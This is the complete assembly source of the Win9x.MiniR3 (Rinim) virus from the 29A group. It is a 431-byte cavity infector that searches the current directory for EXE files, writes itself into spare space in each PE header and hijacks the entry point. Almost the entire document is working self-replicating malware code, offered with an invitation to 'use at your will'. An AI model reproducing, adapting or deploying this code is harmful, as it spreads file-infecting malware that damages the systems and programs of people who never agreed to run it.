   ;
   ;  Win9x.MiniR3 (Mini-Ring3 virus) [aka AVP Win95.Rinim.431]
   ;  Coded by Bumblebee/29A
   ;
   ;  Cavity win9x run-time virus of 431 bytes
   ;  Only uses VxDCALL0...
   ;
   ;  Disclaimer
   ;
   ;  This  is the  source  of  a VIRUS.  Feel free  to use at  your will.
   ;  Notice  that the  author is not  responsabile  of the  damages  that
   ;  may occur due to the assembly of this file.
   ;
   ;  Comments
   ;
   ;  I'm  not good  with optimizations.  I played with  this  virus 'till
   ;  boredom.  But is nice for a win run-time (into ring3).  No infection
   ;  check is  needed because ever  tries to infect the  file in the same
   ;  point: just following the  last section in the header. I tried to do
   ;  it as stable as posible without SEH.
   ;  The cavity  stuff needs  the virus  expands  the header size to load
   ;  into memory in the right way. So i set the header size to code base.
   ;
   ;  This  virus  was  presented to the  world as  infected part  of some
   ;  i-worms like anap and gift family.
   ;
   ;  AVP desc of the baby:
   ;
   ;----------------------------------------------------------------------
   ;Win95.Rinim
   ;
   ;It is not a dangerous nonmemory  resident  parasitic  virus  infecting
   ;Win32 EXE files (PE). It was posted to Internet newsgroups in  October
   ;1999 together with another Windows virus "I-Worm.Gift".
   ;The "Rinim" virus is similar to the "Win95.Murkry" virus and uses  the
   ;same  infection way: When  an  infected files is  executed, the  virus
   ;searches  for all PE-EXE  files  in the current directory  and infects
   ;them. While  infecting a file the  virus writes itself to the not used
   ;space in the PE header. Because the virus  is extremely  short  (about
   ;400 bytes), it is very possible a cave of such size can be found in PE
   ;header.
   ;
   ;The virus has no trigger routine. It contains the text string:
   ;
   ; MiniR3
   ;
   ;----------------------------------------------------------------------
   ;
   ;                                                    The way of the bee
   ;
   .386p
   locals
   .model flat,STDCALL

           vSize           equ     vEnd-vBegin
           KERNEL32        equ     0bff70000h
           FSTGENPAGE      equ     000400000h/1000h
           K               equ     offset vId

           extrn           ExitProcess:PROC        ; needed for 1st generation

   .DATA
           ; dummy data
           db      'WARNING - This is a virus carrier - WARNING'

   .CODE

   vBegin  label   byte
   inicio:
           db      68h                             ; save into stack the
   host_ep:                                        ; hoste ip
           dd      offset exit

           cmp     byte ptr [esp-8h],0fbh          ; test we are under win9x
           pushad                                  ; save all registers
           jne     exitMini

           call    delta                           ; get delta offset
   vId     db      'MiniR3'                        ; virus identifier
   delta:
           pop     ebp                             ; don't use sub ebp, offs..
                                                   ; use K instead (less bytes)

           mov     esi,KERNEL32+3ch                ; scan for VxDCALL0
           lodsd
           add     eax,KERNEL32
           xchg    eax,esi
           mov     esi,dword ptr [esi+78h]
           lea     esi,dword ptr [esi+1ch+KERNEL32]
           lodsd
           mov     eax,dword ptr [eax+KERNEL32]
           add     eax,KERNEL32

           push    eax
           push    20060000h                       ; make current page
           push    0h                              ; r/w
           push    1h
           db      68h
   currPage:
           dd      FSTGENPAGE
           push    1000dh
           call    eax
           pop     dword ptr [_VxDCALL0+ebp-K]     ; now store VxDCALL0 addr
           inc     eax
           jz      exitMini
           inc     eax

           push    00020000h or 00040000h          ; alloc memory
           push    2h
           push    80060000h
           push    00010000h
           call    dword ptr [_VxDCALL0+ebp-K]
           dec     eax
           jz      exitMini
           inc     eax

           mov     dword ptr [vdata+ebp-K],eax     ; save address

           push    00020000h or 00040000h or 80000000h or 8h
           push    0h                              ; commit the memory
           push    1h
           push    2h
           shr     eax,12
           push    eax
           push    00010001h
           call    dword ptr [_VxDCALL0+ebp-K]
           or      eax,eax
           jz      exitMini

           mov     ah,1ah                          ; set DTA
           mov     edx,dword ptr [vdata+ebp-K]     ; to our data buffer
           add     edx,1000h
           call    int21h
           jc      exitMini

           mov     ah,4eh                          ; find 1st exe
           lea     edx,[fmask+ebp-K]
           xor     ecx,ecx
   doNext:
           call    int21h
           jc      exitMini

           mov     edx,dword ptr [vdata+ebp-K]     ; get name
           add     edx,101eh
           call    infection                       ; infect
           mov     ah,4fh                          ; find next

           jmp     doNext

   exitMini:
           popad                                   ; restore regs

           ret                                     ; jmp to hoste

   _VxDCALL0       dd      ?                       ; save VxDCALL0 addr
   vdata           dd      ?                       ; handle for memory
   fmask           db      '*.EXE',0               ; mask for find files

   int21h:                                         ; int 21h using
           push    ecx                             ; VxDCALL0 services
           push    eax
           push    002a0010h
           call    dword ptr [_VxDCALL0+ebp-K]
           ret

   infection:                                      ; infection
           mov     ax,3d02h                        ; open file
           call    int21h
           jc      errorInf
           xchg    eax,ebx

           mov     ah,3fh                          ; read 1000h bytes
           mov     ecx,1000h
           mov     edx,dword ptr [vdata+ebp-K]
           call    int21h
           jc      errorInfC

           mov     edi,edx                         ; test if EXE
           cmp     word ptr [edi],'ZM'
           jne     errorInfC
           add     edi,dword ptr [edi+3ch]         ; test if PE doing a
           add     edx,600h                        ; easy check to avoid
           cmp     edi,edx                         ; exceptions
           jae     errorInfC
           cmp     word ptr [edi],'EP'
           jne     errorInfC

           mov     esi,edi                         ; skip image header and
           mov     eax,18h                         ; optional header
           add     ax,word ptr [edi+14h]
           add     edi,eax

           movzx   cx,word ptr [esi+06h]           ; search end of last
           mov     ax,28h                          ; section desc
           mul     cx
           add     edi,eax

           mov     ecx,dword ptr [esi+2ch]         ; get code base
           mov     dword ptr [esi+54h],ecx         ; expand the header

           push    edi                             ; store new ep get old
           sub     edi,dword ptr [vdata+ebp-K]     ; and save. calc
           xchg    edi,dword ptr [esi+28h]         ; the page for the hoste
           mov     eax,dword ptr [esi+34h]
           add     edi,eax
           shr     eax,12
           mov     dword ptr [currPage+ebp-K],eax
           mov     dword ptr [host_ep+ebp-K],edi
           pop     edi

           mov     ecx,vSize                       ; test if there is space
           xor     eax,eax                         ; spent 2 bytes with
           pushad                                  ; pushad/popad
           rep     scasb                           ; i want to save ecx edi
           popad
           jnz     errorInfC

           lea     esi,[vBegin+ebp-K]              ; copy virus
           rep     movsb

           mov     ah,42h                          ; move BOF (eax is zero)
           cdq                                     ; edx=0
   ; ->    xor     ecx,ecx                         ; and ecx is zero
           call    int21h                          ; after the rep movsb
           jc      errorInfC

           mov     ah,40h                          ; write to disk
           mov     ecx,1000h
           mov     edx,dword ptr [vdata+ebp-K]
           call    int21h

   errorInfC:
           mov     ah,3eh                          ; close the file
           call    int21h

   errorInf:
           ret

   vEnd    label   byte

   exit:
           push    0h
           call    ExitProcess
           jmp     exit

   Ends
   End     inicio
